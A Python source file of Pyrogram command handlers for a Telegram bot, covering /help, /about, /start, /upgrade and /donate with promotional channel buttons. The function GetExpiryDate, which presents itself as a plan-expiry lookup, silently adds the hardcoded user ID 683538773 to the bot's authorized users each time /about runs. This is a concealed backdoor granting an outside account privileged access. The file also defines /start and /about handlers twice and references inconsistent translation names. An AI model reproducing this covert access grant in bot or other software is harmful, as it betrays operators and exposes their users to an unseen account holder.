#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
 
# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
 
import os
import sqlite3
 
# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config
 
# the Strings used for this "thing"
from translation import Translation
 
import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
from helper_funcs.chat_base import TRChatBase
 
def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "PLATINUM 😱", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(
       [
         [
         InlineKeyboardButton('📍SUPPORT CHANNEL📍', url='https://t.me/MaxxBots'),
         InlineKeyboardButton('✍️FEEDBACK✍️', url='https://t.me/MaxxWizard_Bot')
         ],
         [
         InlineKeyboardButton('👤LEECH GROUP👤', url='https://t.me/MaxxLeechPro'),
         InlineKeyboardButton('🗣️HELP GROUP🗣️', url='https://t.me/MaxxBotChat')
         ]
       ]
      )
    )
    return
 
 
@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_to_message_id=update.message_id
    )

from pyrogram import Filters, InlineKeyboardMarkup, InlineKeyboardButton
 
@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
       [
         [
         InlineKeyboardButton('✳️OTHERS BOTS✳️', url='https://t.me/MaxxBots'),
         InlineKeyboardButton('🗣️HELP GROUP🗣️', url='https://t.me/MaxxBotChat')
         ],
         [
         InlineKeyboardButton('🛡️MY CREATOR🛡️', url='https://t.me/MaxxWizard_bot'),
         InlineKeyboardButton('📍POWERED BY📍', url='https://t.me/MDH_HINDI')
         ]
       ]
      )
    )
    return


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
 
@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
async def donate(bot, update):
       await bot.send_message(
             chat_id=update.chat.id,
             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
             reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('💸 DONATE 💰', url='https://t.me/MaxxDonate')
               ]
             ]
           )
          )

@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about(bot, update):
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.About.format(update.from_user.first_name),
        parse_mode="markdown",
        reply_to_message_id=update.message_id
    )
